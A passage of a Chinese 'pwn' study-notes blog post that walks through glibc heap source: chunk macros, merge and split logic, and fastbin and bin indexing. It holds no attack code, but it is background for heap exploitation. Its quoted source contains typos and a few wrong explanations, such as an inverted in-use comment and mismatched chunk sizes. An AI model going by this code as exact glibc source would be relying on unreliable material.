            "title": "pwn学习笔记（7）--堆相关源码",
            "date_published": "2024-03-25T11:10:34.000Z",
            "content_html": "<h1 id=\"相关源码\"><a class=\"markdownIt-Anchor\" href=\"#相关源码\">#</a> 相关源码：</h1>\n<h2 id=\"1-chunk-相关源码\"><a class=\"markdownIt-Anchor\" href=\"#1-chunk-相关源码\">#</a> 1. chunk 相关源码：</h2>\n<p>​\t对于用户来说，只需要确保 malloc () 函数返回的内存不会发生溢出，并且在不用的时候使用 free () 函数将其释放，以后也不再做任何操作即可。而对于 glibc 来说’它要在用户第一次调用 malloc () 函数之前对堆进行初始化；在用户频繁申请和释放时维护堆的结构’保证时间和空间上的效率；同时还要检测过程中可能产生的错误，并及时终止程序。</p>\n<p>​\t首先，先稍微说下几个相关的宏定义。</p>\n<h3 id=\"request2size\"><a class=\"markdownIt-Anchor\" href=\"#request2size\">#</a> request2size()：</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> request2size(req)\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MTNSIZE)  ?\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">MINSIZE :\t\t\t\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK )</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MALLOC_ALIGN_MASK\t\t(MALLOC_ALIGNMENT - 1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MALLOC_ALIGNMENT\t\t(2 * SIZE_SZ)</span></span><br></pre></td></tr></table></figure>\n<p>​\t这个宏将请求的 req 转换成包含 chunk 头部（presize 和 size）的 chunk 大小，示例如下（MINSIZE 默认为 0x20）。</p>\n<ul>\n<li>\n<p>当 req 属于 [0,MINSIZE-MALLOC_ALIGN_MASK-SIZE_SZ)，也就是 [0,9) 时，返回 0x20 ;</p>\n</li>\n<li>\n<p>当 req 为 0x9 时， 返回 (0x9+0x8+0xF)&amp;~0xF ，也就是 0x20 ；</p>\n</li>\n<li>\n<p>当 req 为 0x18 时，返回 (0x18+0x8+0xF)&amp;~0xF，也就是 0x20:</p>\n<p>这里可能会有个问题，那就是 0x18 的 user data 加上头部 0x10 就已经是 0x28 了，为什么返回的 chunk 却是 0x20 。这就是因为如果当前 chunk 在使用中，下一个 chunk 的 prev_inuse 成员就会属于当前 chunk ，所以就多出了 0x8 的使用空间。考虑到这一点，当 req 在 0x9~0x18 之间时，对应的 chunk 大小为 0x10 ；当 req 在 0x19~0x28 之间时，对应的 chunk 大小为 0x20 ，并以此类推。</p>\n</li>\n</ul>\n<h3 id=\"chunk2mem和-mem2chunk\"><a class=\"markdownIt-Anchor\" href=\"#chunk2mem和-mem2chunk\">#</a> chunk2mem () 和 mem2chunk ()：</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> chunk2mem(p)\t\t((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> mem2chunk(mem)\t\t((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>\n<p>​\tchunk2mem () 把指向 chunk 的指针转化成指向 user data 的指针，常出现在 malloc () 函数返回时；mem2chunk () 把指向 user data 的指针转化成指向 chunk 的指针，常出现在 free () 函数开始时。</p>\n<h3 id=\"chunk状态相关\"><a class=\"markdownIt-Anchor\" href=\"#chunk状态相关\">#</a> chunk 状态相关：</h3>\n<ul>\n<li>\n<p>定义 PREV_INUSE、IS_MMAPPED、NONMAIN_ARENA（chunk 是否属于非主线程）以及对三者进行或运算（用于掩码）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* size field is or&#x27;ed with PREV_INUSE when provious adjacent chunk in use */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PREV_INUSE 0x1</span></span><br><span class=\"line\"><span class=\"comment\">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> IS_MMAPPED 0x2</span></span><br><span class=\"line\"><span class=\"comment\">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena .*/</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Bits to mask off when extracting size. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>通过 chunk 指针 p ，对某标志位进行提取、检查、置位和清楚操作。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> prev_inuse(p)\t\t\t((p)-&gt;size &amp; PREV_INUSE)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> chunk_is_mmapped(p)\t\t((p)-&gt;size &amp; IS_MMAPPED)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> chunk_non_main_arena(p)\t((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> inuse(p)\t\t\t\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t((((mchunkptr) (((char *)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_inuse(p)\t\t\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t((mchunkptr) (((char *)(p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> clear_inuse(p)\t\t\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;&gt;size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>由于当前 chunk 的使用状态是由下一个 chunk 的 size 成员的 PREV_INUSE 比特位决定的，所以可以通过下面的宏获得或者修改当前 chunk 的 inuse 状态。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> inuse_bit_at_offset(p,s)\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t(((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_inuse_bit_at_offset(p,s)\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t(((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> clear_inuse_bit_at_offset(p,s)\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t(((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>set_head_size () 修改 size 时不会修改当前 chunk 的标志位，而，ser_head () 会。 seet_foot () 修改下一个 chunk 的 prev_size 时，当前 chunk 一定要处于释放状态，不然下一个 chunk 的 pre_size 是没有意义的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_head_size(p,s)\t\t\t((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BOTS) | (s)))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_head(p,s)\t\t\t\t((p)-&gt;size = (s))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> set_foot(p,s)\t\t\t\t(((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> chunksize(p)\t\t\t\t((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>next_chunk () 将当前 chunk 地址加上当前 chunk 大小获得下一个 chunk 的指针。prev_chunk () 将当前 chunk 的地址减去 prev_size 值获得上一个 chunk 的指针，前提是上一个 chunk 处于释放状态。chunk_at_offset () 将当前 chunk 地址加上 s 偏移处的位置视为一个 chunk。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> next_chunk(p)\t\t\t((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> prev_chunk(p)\t\t\t((mchunkptr) (((char *) (p)) - ((p)-&gt;prev_size)))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> chunk_at_offset(p,s)\t((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"chunk-合并过程\"><a class=\"markdownIt-Anchor\" href=\"#chunk-合并过程\">#</a> chunk 合并过程</h3>\n<p>​\t当一个非 fast bin 的 chunk 被释放，会与相邻的 chunk 进行合并，顺序通常是先向后（上）合并再向前（下）合并。如果向前合并的 chunk 是 top chunk ，则合并之后会形成新的 top chunk ，则合成之后会形成新的 top chunk ；如果不是的话，则合并之后会被加入 unsorted bin 中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(!chunk_is_mmapped(p)) &#123;</span><br><span class=\"line\">    nextchunk = chunk_at_offset(p,size);</span><br><span class=\"line\">\t......</span><br><span class=\"line\">    <span class=\"comment\">/*向后合并，上一个 chunk 是释放状态就进行合并。新 chunk 地址与上一个相同，大小为 p-&gt;size+p-&gt;prev_size，即p减去prev_size */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">        prevsize = p-&gt;prev_size;</span><br><span class=\"line\">        size += prevsize;</span><br><span class=\"line\">        p = chunk_at_offset(p,-((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">        <span class=\"comment\">//到这里已经形成了新的 free chunk 。用 unlink() 将其从双链表中删除。</span></span><br><span class=\"line\">        unlink(av,p,bck,fwd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nextchunk != av-&gt;top) &#123;\t<span class=\"comment\">//检查下一个 chunk 是不是 top chunk</span></span><br><span class=\"line\">        <span class=\"comment\">//如果不是，通过检查下一个 chunk 的 PREV_INUSE 检查一个 chunk 的状态，并清除 inuse 位</span></span><br><span class=\"line\">        nextinuse = inuse_bit_at_offset(nextchunk,nextsize);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!nextinuse) &#123;\t<span class=\"comment\">//如果下一个 chunk 处于使用状态则执行向前合并操作</span></span><br><span class=\"line\">            unlink(av,nextchunk,bck,fwd);</span><br><span class=\"line\">            size += nextsize;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span>\t\t\t\t<span class=\"comment\">//否则清楚下一个 chunk 的 PREV_INUSE</span></span><br><span class=\"line\">            clear_inuse_bit_at_offset(nextchunk,<span class=\"number\">0</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 先将合并后的 chunk 加入 unsorted bin 中</span></span><br><span class=\"line\">        bck = unsorted_chunks(av);</span><br><span class=\"line\">        fwd = bck-&gt;fd;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__glibc_unlikey (fwd-&gt;bk != bck)) &#123;</span><br><span class=\"line\">            errstr = <span class=\"string\">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p-&gt;fd = fwd;</span><br><span class=\"line\">        p-&gt;bk = bck;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class=\"line\">            p-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">            p-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        bck-&gt;fd = p;</span><br><span class=\"line\">        fwd-&gt;bk = p;</span><br><span class=\"line\">        </span><br><span class=\"line\">        set_head(p,size | PREV_INUSE);</span><br><span class=\"line\">        set_foot(p,size);</span><br><span class=\"line\">        check_free_chunk(av,p);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;\t<span class=\"comment\">//如果下一个 chunk 是 top chunk，则合并成新的 top chunk</span></span><br><span class=\"line\">        size += nextsize;</span><br><span class=\"line\">        set_head(p,size | PREV_INUSE);</span><br><span class=\"line\">        av-&gt;top = p;</span><br><span class=\"line\">        check_chunk(av,p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"chunk-拆分过程\"><a class=\"markdownIt-Anchor\" href=\"#chunk-拆分过程\">#</a> chunk 拆分过程：</h3>\n<p>​\t当用户申请的 chunk 较小时，会将一个大的 chunk 进行拆分，合适的部分返回给用户，剩下的部分（称为 remainder）则加入 unsorted bin 中。同时 malloc_state 中的 last_remainder 会记录最近拆分出的 remainder 当然，这个 remainder 的大小至少要为 MINSIZE ，否则不能拆分。</p>\n<p>​\t拆分 chunk 的一种情况是： fast bin 和 small bin 中没有合适的 chunk 、同时 unsorted bin 中有且只有一个可拆分的 chunk 、并且该 chunk 是 last remainder 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb) &amp;&amp;\t\t\t<span class=\"comment\">//申请的 chunk 在 small bin 范围内</span></span><br><span class=\"line\">    bck == unsorted_chunk (av) &amp;&amp;\t\t<span class=\"comment\">//victim 必须是 unsorted bin 中唯一的 chunk </span></span><br><span class=\"line\">    victim == av-&gt;last_remainder &amp;&amp;\t\t<span class=\"comment\">//victim 必须是 last_remainder</span></span><br><span class=\"line\">    (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size) &gt; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb + MINSIZE))</span><br><span class=\"line\">    \t\t\t\t\t\t\t\t\t<span class=\"comment\">//victim 至少要大于 nb+MINSIZE 才可以拆分</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* split and reattach remainder */</span></span><br><span class=\"line\">    remainder_size = size - nb;</span><br><span class=\"line\">    remainder = chunk_at_offset (victim,nb);</span><br><span class=\"line\">    <span class=\"comment\">//将 remainder 加入 unsorted bin 中，同时记录为 last_remainder</span></span><br><span class=\"line\">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class=\"line\">    av-&gt;last_remainder = remainder;</span><br><span class=\"line\">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class=\"line\">    <span class=\"comment\">//如果 remainder 在 large bin 范围内，清空 fd_nextsize 和 bk_nextsize 指针</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class=\"line\">        remainder-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        remainder-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//设置 remainder 的状态栏</span></span><br><span class=\"line\">    set_head (victim,nb | PREV_INUSE |</span><br><span class=\"line\">             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\">    set_foot (remainder, remainder_size);</span><br><span class=\"line\">    </span><br><span class=\"line\">    check_malloc_chunk (av,mvictim,nb);\t\t<span class=\"comment\">//debug 时用来检查 chunk 状态</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *p = chunk2mem (victim);\t\t\t<span class=\"comment\">//获得指向 user data 的指针，返回给用户</span></span><br><span class=\"line\">    <span class=\"comment\">// 如果设置了 perturb_type，将 chunk 的 user data 初始化为 peerturb_type ^ 0xff</span></span><br><span class=\"line\">    alloc_perturb (p,byte);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2bin-相关源码\"><a class=\"markdownIt-Anchor\" href=\"#2bin-相关源码\">#</a> 2.bin 相关源码：</h2>\n<h3 id=\"fastbin-相关\"><a class=\"markdownIt-Anchor\" href=\"#fastbin-相关\">#</a> fastbin 相关：</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据序号获取 fastbinsY 数组中对应的bin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> fastbin(ar_ptr,idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class=\"line\"><span class=\"comment\">//根据 chunk 大小获得位置。因为 MINSIZE 为 0x20，前两个 index 是不可索引的，所以需要减去2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> fastbin_index(sz)\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义了属于 fast_bin 的 chunk 最大值</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class=\"line\"><span class=\"comment\">//定义了 fastbinsY 数组的大小</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure>\n<p>​\tfastbinsY 数组起始并没有保存头结点，而是只保存了 malloc_chunk 的 fd 成员，因为其他成员对于单链表结点并没有用，所以就省略了。如下图所示，这些 fd 指针的初始值为 NULL ，表示对应的 bin 为空，直到有 chunk 加进来时，fd 才保存 chunk 的地址。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/0c64e83715824b93b3e92b89e7b7f2b4.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<ul>\n<li>\n<p>FASTBIN_CONSOLIDATION_THRESHOLD，fastbin 中的 chunk 一般不会与其他 chunk 合并。但如果合并之后的 chunk 大于 FASTBIN_CONSOLIDATION_THRESHOLD，就会触发 malloc_consolidation () 函数，将 fastbin 中的 chunk 与其他 free chunk 合并，然后移动到 unsorted bin 中。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>fast bin 中最大的 chunk 是由 global_max_fast 决定的，这个值一般在堆初始化的时候设置。当然在运行时也是可以设置的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ser_max_fast(s)\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tglobal_max_fast = (((s) == 0)</span></span><br><span class=\"line\">\t\t\t\t\t? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> get_max_fast()\tglobal_max_fast\t</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"bins-相关\"><a class=\"markdownIt-Anchor\" href=\"#bins-相关\">#</a> bins 相关：</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 从 bins 中获取指定序号的 bin 。需要注意 bin 0 是不存在的</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> bin_at(m,i)\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t(mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t- offsetof (struct malloc_chunk,fd))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获得当前 bin 的上一个 bin</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 一般用来获得 bin 中头结点 fd 指向的 chunk 或者bk 指向的 chunk</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> first(b)\t((b)-&gt;fd)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> last(b)\t\t((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>\n<p>​\t可以看到 bin_at (m,i) 宏定义中减去了 offsetof (struct malloc_chunk,fd)，也就是 prev_size 和 size 成员的大小。这是因为 bins 数组实际上只保存了双链表的头结点的 fd 和 bk 指针，如下图：</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/9b48c38704a7434ab4c737ae86cb7720.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\tbins [0] 和 bins [1] 是 unsorted bin 的 fd 和 bk 指针，binat (1) 返回的应该是 unsorted bin 的头指针，但实际上其指向的是 bins [0] 地址减去 offsetof (struct malloc_chunk,fd) 的位置，这样使用头结点指针 b 时，b-&gt;fd 或者 b-&gt;bk 能够正确访问，同时 prev_size 和 size 对于头结点没有意义，所以就被省略了。对于 binat (64) 及之后的 large bin 来说，因为头结点的 size 成员没有意义，所以其 fd_nextsize 和 bk_nextsize 也是没有意义的，也可以省略。</p>\n<p>​\tsmall bin 和 large bin 索引如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 根据 chunk 大小获得其在 small bin 中的索引</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> smallbin_index(sz)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t+ SMALLBIN_CORRECTION)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 根据 chunk 大小获得其在 large bin 中的索引</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> largebin_index(sz)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t(SIZE_SZ == 8 ? largebin_index_64 (sz)\t\t\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t: MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">    : largebin_index_32 (sz))</span></span><br><span 